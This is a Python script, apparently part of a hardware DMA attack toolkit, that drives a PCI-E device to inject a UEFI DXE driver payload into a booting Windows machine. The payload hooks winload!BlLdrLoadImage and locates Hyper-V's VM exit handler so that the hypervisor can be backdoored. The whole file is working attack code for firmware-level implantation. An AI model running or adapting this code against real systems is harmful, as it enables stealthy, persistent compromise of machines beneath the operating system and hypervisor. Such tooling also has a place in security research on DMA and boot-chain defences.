#!/usr/bin/env python

import sys, os
from struct import pack, unpack
from optparse import OptionParser

from pcie_lib import *
from uefi import *

# physical address of _HYPER_V_INFO structure
HV_INFO_ADDR = STATUS_ADDR - (8 * 4)

# debug messages buffer pointer address
OUTPUT_ADDR = HV_INFO_ADDR - 8
OUTPUT_SIZE = PAGE_SIZE

# error codes
BACKDOOR_ERR_UNKNOWN        = -1    # unkown error
BACKDOOR_ERR_WINLOAD_IMAGE  = -2    # winload image not found
BACKDOOR_ERR_WINLOAD_FUNC   = -3    # winload!BlLdrLoadImage() not found
BACKDOOR_ERR_WINLOAD_HOOK   = -4    # winload hook error
BACKDOOR_ERR_HYPER_V_IMAGE  = -5    # Hyper-V image not found
BACKDOOR_ERR_HYPER_V_EXIT   = -6    # Hyper-V VM exit handler not found

# payload DXE driver
DRIVER_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi')

def main():

    parser = OptionParser()

    parser.add_option('-p', '--payload', dest = 'payload', default = DRIVER_PATH,
        help = 'payload file path')

    parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
        help = 'EFI_SYSTEM_TABLE address')    

    parser.add_option('-e', '--prot-entry', dest = 'prot_entry', default = None,
        help = 'PROTOCOL_ENTRY address')    

    parser.add_option('-d', '--debug-output', dest = 'debug_output', default = False, action = 'store_true',
        help = 'read DXE driver debug output')

    parser.add_option('--inj-prot', dest = 'inj_prot', default = False, action = 'store_true',
        help = 'use DXE protocol hook injection method')

    # parse command line
    options, _ = parser.parse_args()

    options.system_table = None if options.system_table is None else int(options.system_table, 16)
    options.prot_entry = None if options.prot_entry is None else int(options.prot_entry, 16)

    if options.debug_output:

        # open device
        dev = TransactionLayer()    

        print('[+] PCI-E link with target is up')

        # read debug output address
        addr = dev.mem_read_8(OUTPUT_ADDR)

        print('[+] Debug output buffer address is 0x%x' % addr)

        # check for the sane address
        if addr > 0x1000 and addr < 0x100000000 and (addr & 0xfff) == 0:

            # read debug output
            data = dev.mem_read(addr, OUTPUT_SIZE)

            print('\n' + data.split('\0')[0])
            return 0

        else:

            print('[!] Invalid address')
            return -1        

    # inject DXE driver into the booting system
    dev = dxe_inject(method = DXE_INJECT_PROT if options.inj_prot else DXE_INJECT_ST,
                     payload = options.payload, system_table = options.system_table,
                     prot_entry = options.prot_entry)
        
    if options.payload is None: return 0

    print('[+] DXE driver was planted, waiting for backdoor init...')    

    while True:

        # wait for DXE backdoor
        status = dev.mem_read_8(STATUS_ADDR)
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        print('[+] DXE driver was executed, you can read its debug messages by running this program with -d option')

        break

    print('[+] Waiting for Hyper-V load...')

    dev.mem_write_8(HV_INFO_ADDR, 0)

    while True:

        # wait for hypervisor
        status, image_base, image_entry, vm_exit = unpack('qQQQ', dev.mem_read(HV_INFO_ADDR, 8 * 4))

        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        if status == BACKDOOR_ERR_WINLOAD_IMAGE:

            print('ERROR: DXE driver is unable to locate winload.efi')
            break

        elif status == BACKDOOR_ERR_WINLOAD_FUNC:

            print('ERROR: DXE driver is unable to locate winload!BlLdrLoadImage()')
            break

        elif status == BACKDOOR_ERR_WINLOAD_HOOK:

            print('ERROR: DXE driver is unable to hook winload!BlLdrLoadImage()')
            break

        elif status == BACKDOOR_ERR_HYPER_V_IMAGE:

            print('ERROR: DXE driver is unable to locate Hyper-V image')
            break

        elif status == BACKDOOR_ERR_HYPER_V_EXIT:

            print('ERROR: DXE driver is unable to locate Hyper-V VM exit handler')
            break

        elif status == BACKDOOR_ERR_UNKNOWN:

            print('ERROR: DXE driver returned unknown error')
            break

        print('[+] Hyper-V image was loaded\n')
        print('    Hyper-V image base: 0x%.16x' % image_base)
        print('           Image entry: 0x%.16x' % image_entry)
        print('       VM exit handler: 0x%.16x\n' % vm_exit)        
        break

    print('[+] DONE')
    
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
